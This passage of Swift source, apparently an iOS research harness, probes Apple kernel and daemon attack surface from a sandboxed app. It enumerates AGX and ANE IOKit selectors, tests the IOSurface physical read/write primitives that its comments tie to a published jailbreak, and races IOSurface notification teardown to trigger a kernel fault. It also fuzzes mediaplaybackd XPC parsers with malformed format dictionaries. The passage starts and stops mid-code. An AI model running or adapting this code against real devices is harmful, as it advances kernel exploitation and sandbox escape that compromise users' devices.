            guard p.hasPrefix(prefix) else { continue }
            let rest = p.dropFirst(prefix.count)
            guard !rest.contains("/") else { continue }
            dirs.append(p)
            if dirs.count >= 3 { break }
        }
        benchLine("     app containers: \(dirs.count) sampled")

        for dir in dirs {
            let handle = dir.withCString { t in group.withCString { g in wq_grant(t, g, flags) } }
            let short = (dir as NSString).lastPathComponent
            guard handle >= 0 else {
                benchLine("     \(short.prefix(8)) ?? grant \(handle)")
                continue
            }
            defer { wq_revoke(handle) }

            let meta = (dir as NSString).appendingPathComponent(metaName)
            var sb = stat()
            let exists = stat(meta, &sb) == 0
            if exists, let data = FileManager.default.contents(atPath: meta),
               let any = try? PropertyListSerialization.propertyList(from: data, format: nil),
               let dict = any as? [String: Any] {
                let id = dict["MCMMetadataIdentifier"] as? String ?? "?"
                benchLine("     \(short.prefix(8)) ?? read ok ?? \(id)")
            } else {
                benchLine("     \(short.prefix(8)) ?? exists=\(exists) ?? read failed errno=\(errno)")
            }
        }

        benchLine("     a readable identifier would let the file manager name app containers")
        benchLine("??? done")
    }

    // MARK: - test 89: what the memory around a surface really is

    /// Test 87 found surfaces 0x4000 apart. The question is whether they share one
    /// VM region (no guard page) or are separate mappings that merely touch. This
    /// walks the regions around a surface and prints their extents.
    func bench89SurfaceRegions() {
        benchLine("??? 89 ?? memory regions around a surface")

        let side = 64
        let bgra: [IOSurfacePropertyKey: Any] = [
            .width: side, .height: side,
            .pixelFormat: kCVPixelFormatType_32BGRA,
            .bytesPerElement: 4, .bytesPerRow: side * 4,
            .allocSize: side * side * 4,
        ]
        var surfaces: [IOSurfaceRef] = []
        for _ in 0..<3 {
            guard let s = IOSurfaceCreate(bgra as CFDictionary) else { continue }
            surfaces.append(s)
        }
        guard let first = surfaces.first else { benchLine("[NO] surface"); return }
        let base = UInt64(UInt(bitPattern: IOSurfaceGetBaseAddress(first)))
        benchLine("     base 0x\(String(base, radix: 16)) ?? alloc 0x\(String(IOSurfaceGetAllocSize(first), radix: 16))")

        func region(at address: UInt64) -> (start: UInt64, size: UInt64, prot: Int32)? {
            var addr = address
            var size: mach_vm_size_t = 0
            var info = vm_region_basic_info_data_64_t()
            var count = mach_msg_type_number_t(
                MemoryLayout<vm_region_basic_info_data_64_t>.size / MemoryLayout<natural_t>.size)
            var object: mach_port_t = 0
            let kr = withUnsafeMutablePointer(to: &info) { pointer in
                pointer.withMemoryRebound(to: integer_t.self, capacity: Int(count)) { rebound in
                    xq_mach_vm_region(mach_task_self_, &addr, &size, VM_REGION_BASIC_INFO_64,
                                      rebound, &count, &object)
                }
            }
            guard kr == KERN_SUCCESS else { return nil }
            return (addr, size, info.protection)
        }

        guard let home = region(at: base) else {
            benchLine("[NO] vm_region failed"); return
        }
        benchLine("     region 0x\(String(home.start, radix: 16)) ?? size 0x\(String(home.size, radix: 16)) ?? prot \(home.prot)")

        // Where does the surface sit inside its region, and is the neighbour inside
        // the same one?
        let offset = base - home.start
        let room = home.size - offset
        benchLine("     surface starts +0x\(String(offset, radix: 16)) inside ?? 0x\(String(room, radix: 16)) bytes to the region end")

        if let second = surfaces.dropFirst().first {
            let secondBase = UInt64(UInt(bitPattern: IOSurfaceGetBaseAddress(second)))
            let sameRegion = secondBase >= home.start && secondBase < home.start + home.size
            benchLine("     next surface 0x\(String(secondBase, radix: 16)) ?? \(sameRegion ? "same region" : "different region")")
        }

        // Walk the next few regions to show what follows the surface.
        benchLine("     regions above the surface:")
        var cursor = home.start + home.size
        for _ in 0..<4 {
            guard let next = region(at: cursor) else {
                benchLine("          unmapped after 0x\(String(cursor, radix: 16))")
                break
            }
            benchLine("          0x\(String(next.start, radix: 16)) ?? size 0x\(String(next.size, radix: 16)) ?? prot \(next.prot)")
            cursor = next.start + next.size
            if cursor - base > 0x400000 { break }
        }

        benchLine("     one region for several surfaces means no guard page between them")
        benchLine("??? done")
    }

    // MARK: - test 90: the AGX command-path selectors from the sandbox

    /// A macOS PoC drives the GPU through selectors 7 / 14 / 16 / 28 / 29
    /// (command queue, shared memory, notification queue, submit). This asks the
    /// same selectors on this device to see whether that path is open at all.
    func bench90AGXCommandPath() {
        benchLine("??? 90 ?? AGX command-path selectors")

        var svc: io_service_t = 0
        for name in ["AGXAcceleratorG18P", "AGXAccelerator", "AGXAcceleratorG17P"] {
            guard let m = name.withCString({ xq_IOServiceMatching($0) }) else { continue }
            var it: io_iterator_t = 0
            guard xq_IOServiceGetMatchingServices(0, m, &it) == KERN_SUCCESS else { continue }
            let s = xq_IOIteratorNext(it)
            xq_IOObjectRelease(it)
            if s != 0 {
                svc = s
                benchLine("     service: \(name) ?? handle \(s)")
                break
            }
        }
        guard svc != 0 else { benchLine("[NO] AGX service"); return }
        defer { xq_IOObjectRelease(svc) }

        func name(_ kr: kern_return_t) -> String {
            switch kr {
            case 0: return "ok"
            case -536870206: return "BadArgument"
            case -536870201: return "Unsupported"
            case -536870199: return "NotPermitted"
            case -536870207: return "NotPrivileged"
            case -536870212: return "Error"
            case -536870160: return "NotReady"
            case -536870211: return "NoMemory"
            default: return "kr=\(kr)"
            }
        }

        var conn: io_connect_t = 0
        var openedType: UInt32?
        for type in UInt32(0)...4 {
            let kr = xq_IOServiceOpen(svc, mach_task_self_, type, &conn)
            benchLine("     open type \(type): \(name(kr))")
            if kr == 0 { openedType = type; break }
        }
        guard let openedType else {
            benchLine("[NO] the client cannot be opened; the command path is closed here")
            benchLine("??? done")
            return
        }
        defer { xq_IOServiceClose(conn) }
        benchLine("     using client type \(openedType)")

        func call(_ sel: UInt32, inSize: Int, outSize: Int) -> kern_return_t {
            var input = [UInt8](repeating: 0, count: max(inSize, 1))
            var out = [UInt8](repeating: 0, count: max(outSize, 1))
            var outCnt = outSize
            var scount: UInt32 = 0
            var sOut = [UInt64](repeating: 0, count: 4)
            var kr: kern_return_t = -1
            input.withUnsafeBytes { ib in
                out.withUnsafeMutableBytes { ob in
                    sOut.withUnsafeMutableBufferPointer { sop in
                        kr = xq_IOConnectCallMethod(conn, sel, nil, 0,
                                                    inSize > 0 ? ib.baseAddress : nil, inSize,
                                                    sop.baseAddress, &scount,
                                                    outSize > 0 ? ob.baseAddress : nil, &outCnt)
                    }
                }
            }
            return kr
        }

        // Names from the macOS PoC, so the log reads the same way.
        let table: [(UInt32, String)] = [
            (7, "create command queue"),
            (14, "create shared memory"),
            (16, "create notification queue"),
            (28, "set notification queue"),
            (29, "submit command buffers"),
        ]
        let sizes = [0, 8, 0x10, 0x18, 0x20, 0x28, 0x40]

        var accepted = 0
        for (sel, label) in table {
            var answers: [String] = []
            for inSize in sizes {
                for outSize in [0x10, 0x40] {
                    let kr = call(sel, inSize: inSize, outSize: outSize)
                    if kr != -536870206 {
                        answers.append("in 0x\(String(inSize, radix: 16))/out 0x\(String(outSize, radix: 16)) ??? \(name(kr))")
                        accepted += 1
                    }
                }
            }
            if answers.isEmpty {
                benchLine("     sel \(sel) \(label): BadArgument for every size")
            } else {
                benchLine("     sel \(sel) \(label):")
                for a in answers.prefix(4) { benchLine("          \(a)") }
            }
        }

        benchLine("     non-BadArgument answers: \(accepted)")
        benchLine(accepted > 0
                  ? "[?] those selectors exist here ??? the shapes need work"
                  : "[NO] the command path is not addressable with this client")
        benchLine("??? done")
    }

    // MARK: - test 91: the ANE interface from the sandbox

    /// The ANE kext grew by 64 KB between 27.0.1 and 27.2, so the interface moved.
    /// This asks whether its user client opens at all from an application and how
    /// far the selector table gets.
    func bench91ANEInterface() {
        benchLine("??? 91 ?? ANE interface reachability")

        var svc: io_service_t = 0
        for name in ["H11ANEIn", "AppleT8150ANEHAL", "AppleH16ANEInterface", "AppleH13ANEInterface"] {
            guard let m = name.withCString({ xq_IOServiceMatching($0) }) else { continue }
            var it: io_iterator_t = 0
            guard xq_IOServiceGetMatchingServices(0, m, &it) == KERN_SUCCESS else { continue }
            let s = xq_IOIteratorNext(it)
            xq_IOObjectRelease(it)
            if s != 0 {
                svc = s
                benchLine("     service: \(name) ?? handle \(s)")
                break
            }
        }
        guard svc != 0 else {
            benchLine("[NO] no ANE service is published to this process")
            benchLine("??? done")
            return
        }
        defer { xq_IOObjectRelease(svc) }

        func name(_ kr: kern_return_t) -> String {
            switch kr {
            case 0: return "ok"
            case -536870206: return "BadArgument"
            case -536870201: return "Unsupported"
            case -536870199: return "NotPermitted"
            case -536870207: return "NotPrivileged"
            case -536870212: return "Error"
            case -536870160: return "NotReady"
            case -536870174: return "NotAttached"
            default: return "kr=\(kr)"
            }
        }

        var conn: io_connect_t = 0
        var opened: UInt32?
        for type in UInt32(0)...7 {
            let kr = xq_IOServiceOpen(svc, mach_task_self_, type, &conn)
            benchLine("     open type \(type): \(name(kr))")
            if kr == 0 { opened = type; break }
        }
        guard let opened else {
            benchLine("[NO] the ANE client refuses every type; nothing to drive from here")
            benchLine("??? done")
            return
        }
        defer { xq_IOServiceClose(conn) }
        benchLine("     using client type \(opened)")

        func call(_ sel: UInt32, inSize: Int, outSize: Int) -> kern_return_t {
            var input = [UInt8](repeating: 0, count: max(inSize, 1))
            var out = [UInt8](repeating: 0, count: max(outSize, 1))
            var outCnt = outSize
            var scount: UInt32 = 0
            var sOut = [UInt64](repeating: 0, count: 4)
            var kr: kern_return_t = -1
            input.withUnsafeBytes { ib in
                out.withUnsafeMutableBytes { ob in
                    sOut.withUnsafeMutableBufferPointer { sop in
                        kr = xq_IOConnectCallMethod(conn, sel, nil, 0,
                                                    inSize > 0 ? ib.baseAddress : nil, inSize,
                                                    sop.baseAddress, &scount,
                                                    outSize > 0 ? ob.baseAddress : nil, &outCnt)
                    }
                }
            }
            return kr
        }

        var reachable: [String] = []
        for sel in UInt32(0)...12 {
            var hit: String?
            for inSize in [0, 8, 0x10, 0x20, 0x40] {
                for outSize in [0, 0x10, 0x40] {
                    let kr = call(sel, inSize: inSize, outSize: outSize)
                    if kr != -536870206 && hit == nil {
                        hit = "in 0x\(String(inSize, radix: 16))/out 0x\(String(outSize, radix: 16)) ??? \(name(kr))"
                    }
                }
            }
            if let hit {
                benchLine("     sel \(sel): \(hit)")
                reachable.append("\(sel)")
            }
        }

        if reachable.isEmpty {
            benchLine("[NO] every selector answers BadArgument ??? the table is not ours to call")
        } else {
            benchLine("[?] selectors that answered: \(reachable.joined(separator: ", "))")
        }
        benchLine("     ANE work is scheduled by aned; the app side is only a courier")
        benchLine("??? done")
    }

@_silgen_name("mach_make_memory_entry_64")
func xq_mach_make_memory_entry_64(_ target: vm_map_t,
                                  _ size: UnsafeMutablePointer<mach_vm_size_t>,
                                  _ offset: mach_vm_offset_t,
                                  _ permission: vm_prot_t,
                                  _ object: UnsafeMutablePointer<mach_port_t>,
                                  _ parent: mach_port_t) -> kern_return_t

@_silgen_name("mach_vm_map")
func xq_mach_vm_map(_ target: vm_map_t,
                    _ address: UnsafeMutablePointer<mach_vm_address_t>,
                    _ size: mach_vm_size_t,
                    _ mask: mach_vm_offset_t,
                    _ flags: Int32,
                    _ object: mach_port_t,
                    _ offset: memory_object_offset_t,
                    _ copy: boolean_t,
                    _ cur: vm_prot_t,
                    _ max: vm_prot_t,
                    _ inherit: vm_inherit_t) -> kern_return_t

@_silgen_name("IOSurfacePrefetchPages")
func xq_IOSurfacePrefetchPages(_ buffer: IOSurfaceRef) -> kern_return_t

struct mach_header { var magic: UInt32; var cputype: Int32; var cpusubtype: Int32; var filetype: UInt32; var ncmds: UInt32; var sizeofcmds: UInt32; var flags: UInt32; var reserved: UInt32 }

@_silgen_name("_dyld_image_count")
func xq_dyld_image_count() -> UInt32

@_silgen_name("_dyld_get_image_header")
func xq_dyld_get_image_header(_ index: UInt32) -> UnsafePointer<mach_header>?

@_silgen_name("_dyld_get_image_name")
func xq_dyld_get_image_name(_ index: UInt32) -> UnsafePointer<CChar>?

@_silgen_name("_dyld_get_image_vmaddr_slide")
func xq_dyld_get_image_vmaddr_slide(_ index: UInt32) -> Int

@_silgen_name("mach_vm_allocate")
func xq_mach_vm_allocate(_ target: vm_map_t,
                         _ address: UnsafeMutablePointer<mach_vm_address_t>,
                         _ size: mach_vm_size_t,
                         _ flags: Int32) -> kern_return_t

    // MARK: - test 92: the IOSurface primitives a physical exploit is built on

    /// A published jailbreak builds its physical read/write on top of IOSurface:
    /// a physically contiguous surface in the GPU region, a memory entry over it,
    /// a second mapping of the same pages, and a surface created at a chosen
    /// address. This asks whether any of that is still allowed here.
    func bench92SurfacePrimitives() {
        benchLine("??? 92 ?? IOSurface physical primitives")

        let page = UInt64(vm_page_size)
        benchLine("     page size \(page)")

        // 1. a surface in the GPU memory region, which is contiguous by nature
        let region: [IOSurfacePropertyKey: Any] = [
            .allocSize: page * 2,
            .width: 64, .height: 2,
            .pixelFormat: kCVPixelFormatType_32BGRA,
            .bytesPerElement: 4, .bytesPerRow: 64 * 4,
            IOSurfacePropertyKey(rawValue: "IOSurfaceMemoryRegion"): "PurpleGfxMem",
        ]
        guard let gpuSurface = IOSurfaceCreate(region as CFDictionary) else {
            benchLine("[NO] PurpleGfxMem surface refused")
            benchLine("??? done")
            return
        }
        let gpuBase = UInt(bitPattern: IOSurfaceGetBaseAddress(gpuSurface))
        benchLine("     PurpleGfxMem surface ok ?? base 0x\(String(gpuBase, radix: 16)) ?? alloc 0x\(String(IOSurfaceGetAllocSize(gpuSurface), radix: 16))")

        // 2. a memory entry over those pages
        var entrySize = mach_vm_size_t(IOSurfaceGetAllocSize(gpuSurface))
        var entryPort: mach_port_t = 0
        let mk = xq_mach_make_memory_entry_64(mach_task_self_, &entrySize,
                                              mach_vm_offset_t(gpuBase),
                                              vm_prot_t(VM_PROT_READ | VM_PROT_WRITE),
                                              &entryPort, 0)
        let entry: mach_port_t? = entryPort != 0 ? entryPort : nil
        benchLine("     mach_make_memory_entry_64: \(surfaceKR(mk)) ?? entry \(entry.map { "0x" + String($0, radix: 16) } ?? "nil") ?? size 0x\(String(entrySize, radix: 16))")
        if mk != KERN_SUCCESS { benchLine("     the alias step is closed here") }

        // 3. map the same physical pages a second time
        if mk == KERN_SUCCESS, entry != nil {
            var alias: mach_vm_address_t = 0
            var aliasSize = mach_vm_size_t(IOSurfaceGetAllocSize(gpuSurface))
            let mapKR = xq_mach_vm_map(mach_task_self_, &alias, aliasSize, 0,
                                       Int32(VM_FLAGS_ANYWHERE),
                                       entry!, 0, boolean_t(0),
                                       vm_prot_t(VM_PROT_READ | VM_PROT_WRITE),
                                       vm_prot_t(VM_PROT_READ | VM_PROT_WRITE),
                                       VM_INHERIT_NONE)
            benchLine("     mach_vm_map alias: \(surfaceKR(mapKR))" + (mapKR == KERN_SUCCESS ? " ?? at 0x\(String(alias, radix: 16))" : ""))
            if mapKR == KERN_SUCCESS {
                let source = UnsafeMutableRawPointer(bitPattern: gpuBase)
                let aliasPtr = UnsafeMutableRawPointer(bitPattern: UInt(alias))
                if let source, let aliasPtr {
                    let marker: UInt32 = 0xC0FFEE27
                    source.storeBytes(of: marker, as: UInt32.self)
                    let seen = aliasPtr.load(as: UInt32.self)
                    benchLine("     wrote 0x\(String(marker, radix: 16)) to the surface, alias reads 0x\(String(seen, radix: 16))")
                    benchLine(seen == marker
                              ? "[OK] the alias points at the same physical pages"
                              : "[NO] the alias is a separate copy")
                }
            }
        }

        // 4. a surface placed at an address we choose
        var chosen: mach_vm_address_t = 0
        let reserveKR = xq_mach_vm_allocate(mach_task_self_, &chosen, page,
                                            Int32(VM_FLAGS_ANYWHERE))
        if reserveKR == KERN_SUCCESS {
            let at: [IOSurfacePropertyKey: Any] = [
                IOSurfacePropertyKey(rawValue: "IOSurfaceAddress"): NSNumber(value: chosen),
                IOSurfacePropertyKey(rawValue: "IOSurfaceAllocSize"): NSNumber(value: page),
            ]
            let atSurface = IOSurfaceCreate(at as CFDictionary)
            benchLine("     surface at a chosen address 0x\(String(chosen, radix: 16)): \(atSurface != nil ? "ok" : "refused")")
            if let atSurface {
                _ = xq_IOSurfacePrefetchPages(atSurface)
                benchLine("          prefetch pages: called ?? base 0x\(String(UInt(bitPattern: IOSurfaceGetBaseAddress(atSurface)), radix: 16))")
            }
        }

        // 5. the socket knob a kernel write is often built on
        let fd = socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6)
        if fd >= 0 {
            var filter = [UInt8](repeating: 0xFF, count: 32)
            let kr = filter.withUnsafeBytes { buffer in
                setsockopt(fd, IPPROTO_ICMPV6, ICMP6_FILTER, buffer.baseAddress, socklen_t(buffer.count))
            }
            benchLine("     ICMP6_FILTER setsockopt: \(kr == 0 ? "ok" : "errno \(errno)")")
            close(fd)
        } else {
            benchLine("     ICMPv6 socket refused ?? errno \(errno)")
        }

        benchLine("??? done")
    }

    private func surfaceKR(_ kr: kern_return_t) -> String {
        kr == KERN_SUCCESS ? "ok" : "0x\(String(UInt32(bitPattern: kr), radix: 16))"
    }

    // MARK: - test 93: the notification teardown window

    /// 27.2 added a guard that refuses to register a notification on an object
    /// that has begun tearing down, and reordered teardown to unlink first. This
    /// build has neither. The test below hammers that window: several threads
    /// register and release surfaces in a tight loop, and the harness reports how
    /// many calls were accepted and whether the process survived.
    ///
    /// A hit here is a kernel fault, not a user-space error ??? the device can panic.
    func bench93NotifyTeardown() {
        benchLine("??? 93 ?? IOSurface notification teardown window")

        // Which notification entry points exist at all.
        let candidates = [
            "IOSurfaceRegisterNotify", "IOSurfaceUnregisterNotify",
            "IOSurfaceRemoveNotify", "IOSurfaceSetNotificationPort",
            "IOSurfaceGetNotificationPort", "IOSurfaceNotify",
        ]
        var available: [String: UnsafeMutableRawPointer] = [:]
        for name in candidates {
            if let sym = dlsym(UnsafeMutableRawPointer(bitPattern: -2), name) {
                available[name] = sym
                benchLine("     \(name): present")
            } else {
                benchLine("     \(name): absent")
            }
        }

        guard let registerSym = available["IOSurfaceRegisterNotify"] else {
            benchLine("[NO] no notification entry point is exported here")
            benchLine("??? done")
            return
        }

        typealias RegisterFn = @convention(c) (IOSurfaceRef, CFString, mach_port_t) -> kern_return_t
        let registerFn = unsafeBitCast(registerSym, to: RegisterFn.self)
        let unregisterFn: (@convention(c) (IOSurfaceRef, CFString, mach_port_t) -> kern_return_t)?
        if let sym = available["IOSurfaceUnregisterNotify"] {
            unregisterFn = unsafeBitCast(sym, to: RegisterFn.self)
        } else if let sym = available["IOSurfaceRemoveNotify"] {
            unregisterFn = unsafeBitCast(sym, to: RegisterFn.self)
        } else {
            unregisterFn = nil
        }
        benchLine("     unregister available: \(unregisterFn != nil)")

        // The types IOSurface knows about.
        let types: [String] = [
            "IOSurfaceWillChange", "IOSurfaceDidChange", "IOSurfaceWillDraw",
            "IOSurfaceDidDraw", "IOSurfaceWillDisplay", "IOSurfaceDidDisplay",
        ]

        // A port to receive notifications on.
        var port: mach_port_t = 0
        let allocKR = mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &port)
        benchLine("     notification port: \(surfaceKR(allocKR))" + (allocKR == KERN_SUCCESS ? " ?? 0x\(String(port, radix: 16))" : ""))
        guard allocKR == KERN_SUCCESS else { benchLine("??? done"); return }

        let cycles = 400
        let threads = 4
        var accepted = 0
        var refused = 0
        let lock = NSLock()
        let group = DispatchGroup()

        let deadline = Date().addingTimeInterval(3.0)

        for _ in 0..<threads {
            group.enter()
            DispatchQueue.global(qos: .userInitiated).async {
                var localAccepted = 0
                var localRefused = 0
                var index = 0
                while Date() < deadline {
                    index += 1
                    guard let made = self.benchMakeSurface(headerPerSlice: 0x1000) else { continue }
                    let surface = made.1
                    if let unregisterFn {
                        let type = types[index % types.count] as CFString
                        _ = unregisterFn(surface, type, port)
                    }
                    // Register on a live surface, then drop our reference so the
                    // kernel tears the object down while another thread is still
                    // working on the same type.
                    let type = types[index % types.count] as CFString
                    let kr = registerFn(surface, type, port)
                    if kr == KERN_SUCCESS { localAccepted += 1 } else { localRefused += 1 }
                    _ = surface  // released with the scope
                }
                lock.lock()
                accepted += localAccepted
                refused += localRefused
                lock.unlock()
                group.leave()
            }
        }
        _ = group.wait(timeout: .now() + 8)

        benchLine("     cycles requested \(cycles * threads) ?? accepted \(accepted) ?? refused \(refused)")
        benchLine("     process survived ?? a hit would be a kernel fault, not a kr")
        benchLine("??? done")
    }

    // MARK: - test 94: what the IOSurface framework actually exports

    /// Test 93 found no notification entry point by name, so the API must be
    /// called something else. This lists the strings the framework carries that
    /// look like exported names and resolves each candidate through dlsym.
    func bench94SurfaceExports() {
        benchLine("??? 94 ?? IOSurface framework exports")

        guard let handle = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY) else {
            benchLine("[NO] the framework does not load")
            benchLine("??? done")
            return
        }
        defer { dlclose(handle) }

        var index: UInt32 = 0
        var header: UnsafeRawPointer?
        for i in 0..<xq_dyld_image_count() {
            guard let name = xq_dyld_get_image_name(i) else { continue }
            if String(cString: name).contains("IOSurface.framework") {
                index = i
                header = UnsafeRawPointer(xq_dyld_get_image_header(i))
                break
            }
        }
        guard let header else {
            benchLine("[NO] the image is not mapped")
            benchLine("??? done")
            return
        }
        let slide = xq_dyld_get_image_vmaddr_slide(index)
        benchLine("     image \(index) ?? slide 0x\(String(slide, radix: 16))")

        let magic = header.load(as: UInt32.self)
        let ncmds = header.load(fromByteOffset: 16, as: UInt32.self)
        benchLine("     magic 0x\(String(magic, radix: 16)) ?? commands \(ncmds)")

        var bytes = [UInt8]()
        var cursor = header.advanced(by: 32)
        for _ in 0..<Int(ncmds) {
            let cmd = cursor.load(as: UInt32.self)
            let cmdsize = Int(cursor.load(fromByteOffset: 4, as: UInt32.self))
            if cmdsize < 8 { break }
            if cmd == 0x19 {                       // LC_SEGMENT_64
                let vmaddr = cursor.load(fromByteOffset: 24, as: UInt64.self)
                let filesize = cursor.load(fromByteOffset: 48, as: UInt64.self)
                var segName = ""
                for i in 0..<16 {
                    let ch = cursor.load(fromByteOffset: 8 + i, as: UInt8.self)
                    if ch == 0 { break }
                    segName.append(Character(UnicodeScalar(ch)))
                }
                let size = Int(filesize)
                if segName == "__TEXT", size > 0, size < 32 * 1024 * 1024,
                   let start = UnsafeRawPointer(bitPattern: Int(vmaddr) + slide) {
                    bytes.append(contentsOf: UnsafeRawBufferPointer(start: start, count: size))
                }
            }
            cursor = cursor.advanced(by: cmdsize)
        }
        benchLine("     scanned \(bytes.count) bytes")

        var names = Set<String>()
        var run: [UInt8] = []
        for byte in bytes {
            if byte >= 0x20 && byte < 0x7F {
                run.append(byte)
                if run.count > 96 { run.removeAll(keepingCapacity: true) }
            } else {
                if run.count >= 8, let s = String(bytes: run, encoding: .utf8), s.hasPrefix("IOSurface") {
                    names.insert(s)
                }
                run.removeAll(keepingCapacity: true)
            }
        }

        let notifyish = names.filter { $0.lowercased().contains("notif") }.sorted()
        benchLine("     IOSurface* strings \(names.count) ?? with 'notif' \(notifyish.count)")
        for name in notifyish.prefix(24) {
            benchLine("          \(name) ??? \(dlsym(handle, name) != nil ? "exported" : "not")")
        }

        let ports = names.filter {
            let lower = $0.lowercased()
            return lower.contains("port") || lower.contains("usecount") || lower.contains("remove")
        }.sorted()
        benchLine("     port / use-count / remove names:")
        for name in ports.prefix(20) {
            benchLine("          \(name) ??? \(dlsym(handle, name) != nil ? "exported" : "not")")
        }

        benchLine("??? done")
    }

    // MARK: - steering parser

    /// "pars" on samplegenerator feeds kFigSteeringParserMsgParam_Data straight
    /// into MediaToolbox's container parser. That is a real parser reachable
    /// from an unprivileged app, so send a genuine file first and see whether
    /// the daemon parses it.
    func steeringParserProbe() {
        emit("xsp: steering parser")
        guard let mp4 = Bundle.main.url(forResource: "real_v", withExtension: "mp4"),
              let data = try? Data(contentsOf: mp4) else {
            emit("xsp: sample missing"); return
        }
        emit("xsp: sample \(data.count) bytes")

        guard let c = "com.apple.coremedia.mediaplaybackd.samplegenerator.xpc"
            .withCString({ xq_connection_create_service($0, queue, 0) }) else {
            emit("xsp: connect failed"); return
        }
        xq_set_event_handler(c) { [weak self] e in
            guard let self else { return }
            self.emit("xsp: SERVER EVENT \(self.describe(e))")
        }
        xq_resume(c)

        var tok: Int64 = 0
        if let ping = xq_dictionary_create(nil, nil, 0) {
            ".Operation".withCString { xq_dictionary_set_uint64(ping, $0, 0x2e706e67) }
            ".ProcessName".withCString { k in
                "Bench27".withCString { v in xq_dictionary_set_string(ping, k, v) }
            }
            if let r = sendSync(c, ping, timeout: 4.0) {
                tok = ".Token".withCString { xq_dictionary_get_int64(r, $0) }
                xq_release(r)
            }
            xq_release(ping)
        }
        emit("xsp: token=\(tok)")
        guard tok != 0 else { xq_release(c); return }

        // pars is a method on a sample generator object, so create one first.
        var genID: UInt64 = 0
        for op in ["Gcr8", "Bcr8"] {
            let fourcc = op.utf8.reduce(UInt32(0)) { ($0 << 8) | UInt32($1) }
            if let m = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(m, $0, UInt64(fourcc)) }
                ".Token".withCString { xq_dictionary_set_int64(m, $0, tok) }
                if let r = sendSync(c, m, timeout: 6.0) {
                    let err = ".ErrorReturn".withCString { xq_dictionary_get_int64(r, $0) }
                    let oid = ".objectID".withCString { xq_dictionary_get_uint64(r, $0) }
                    emit("xsp: \(op) err=\(err) id=\(oid)")
                    emit("xsp:   \(describe(r))")
                    if oid != 0 && genID == 0 { genID = oid }
                    xq_release(r)
                }
                xq_release(m)
            }
            Thread.sleep(forTimeInterval: 0.5)
        }
        emit("xsp: generator id=\(genID)")

        for variant in ["full", "data-only"] {
            if let m = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x70617273) }
                ".Token".withCString { xq_dictionary_set_int64(m, $0, tok) }
                if genID != 0 { ".objectID".withCString { xq_dictionary_set_uint64(m, $0, genID) } }
                data.withUnsafeBytes { raw in
                    if let d = xq_data_create(raw.baseAddress, raw.count) {
                        "Data".withCString { xq_dictionary_set_value(m, $0, d) }
                        xq_release(d)
                    }
                }
                if variant == "full" {
                    "BaseURL".withCString { k in
                        mp4.absoluteString.withCString { v in xq_dictionary_set_string(m, k, v) }
                    }
                    "ContinueParsingAfterError".withCString { xq_dictionary_set_int64(m, $0, 1) }
                    "AddWarningsToErrorLog".withCString { xq_dictionary_set_int64(m, $0, 1) }
                }
                if let r = sendSync(c, m, timeout: 10.0) {
                    let hasErr = ".ErrorReturn".withCString { xq_dictionary_get_value(r, $0) } != nil
                    let err = ".ErrorReturn".withCString { xq_dictionary_get_int64(r, $0) }
                    emit("xsp: pars[\(variant)] -> \(hasErr ? "err=\(err)" : "no ErrorReturn")")
                    emit("xsp:   \(describe(r))")
                    xq_release(r)
                } else {
                    emit("xsp: pars[\(variant)] -> no reply")
                }
                xq_release(m)
            }
            Thread.sleep(forTimeInterval: 0.8)
        }
        xq_cancel(c); xq_release(c)
        emit("xsp: done")
    }

    // MARK: - format description fuzzing

    /// The tap create path copies PreferredFormat through FigXPC's format
    /// description deserializer. That code parses a dictionary we control:
    /// sizes, counts, nested arrays. Feed it inconsistent shapes and watch for
    /// a fault that is not a null dereference.
    func formatDescFuzz() {
        emit("xfz: format description fuzz")
        guard let c = "com.apple.coremedia.mediaplaybackd.audioprocessingtap.xpc"
            .withCString({ xq_connection_create_service($0, queue, 0) }) else {
            emit("xfz: connect failed"); return
        }
        xq_set_event_handler(c) { _ in }
        xq_resume(c)
        var tok: Int64 = 0
        if let ping = xq_dictionary_create(nil, nil, 0) {
            ".Operation".withCString { xq_dictionary_set_uint64(ping, $0, 0x2e706e67) }
            ".ProcessName".withCString { k in
                "Bench27".withCString { v in xq_dictionary_set_string(ping, k, v) }
            }
            if let r = sendSync(c, ping, timeout: 4.0) {
                tok = ".Token".withCString { xq_dictionary_get_int64(r, $0) }
                xq_release(r)
            }
            xq_release(ping)
        }
        guard tok != 0 else { emit("xfz: no token"); xq_release(c); return }

        // Each case builds PreferredFormat differently.
        let cases: [(String, (XObj) -> Void)] = [
            ("dims-huge", { d in
                if let a = xq_array_create(nil, 0) {
                    xq_array_append_int64(a, 0x40000000)
                    xq_array_append_int64(a, 0x40000000)
                    "Dimensions".withCString { xq_dictionary_set_value(d, $0, a) }
                    xq_release(a)
                }
            }),
            ("dims-negative", { d in
                if let a = xq_array_create(nil, 0) {
                    xq_array_append_int64(a, -1)
                    xq_array_append_int64(a, -1)
                    "Dimensions".withCString { xq_dictionary_set_value(d, $0, a) }
                    xq_release(a)
                }
            }),
            ("dims-short", { d in
                if let a = xq_array_create(nil, 0) {
                    xq_array_append_int64(a, 16)
                    "Dimensions".withCString { xq_dictionary_set_value(d, $0, a) }
                    xq_release(a)
                }
            }),
            ("dims-wrong-type", { d in
                "Dimensions".withCString { k in
                    "not-an-array".withCString { v in xq_dictionary_set_string(d, k, v) }
                }
            }),
            ("mediatype-huge", { d in
                "MediaType".withCString { xq_dictionary_set_uint64(d, $0, 0xFFFFFFFFFFFFFFFF) }
                "MediaSubType".withCString { xq_dictionary_set_uint64(d, $0, 0xFFFFFFFFFFFFFFFF) }
            }),
            ("extensions-deep", { d in
                if let inner = xq_dictionary_create(nil, nil, 0) {
                    if let arr = xq_array_create(nil, 0) {
                        for _ in 0..<64 { xq_array_append_int64(arr, 0x7FFFFFFFFFFFFFFF) }
                        "Values".withCString { xq_dictionary_set_value(inner, $0, arr) }
                        xq_release(arr)
                    }
                    "Extensions".withCString { xq_dictionary_set_value(d, $0, inner) }
                    xq_release(inner)
                }
            }),
        ]

        for (label, build) in cases {
            if let m = xq_dictionary_create(nil, nil, 0),
               let fmt = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x63726538) }
                ".Token".withCString { xq_dictionary_set_int64(m, $0, tok) }
                build(fmt)
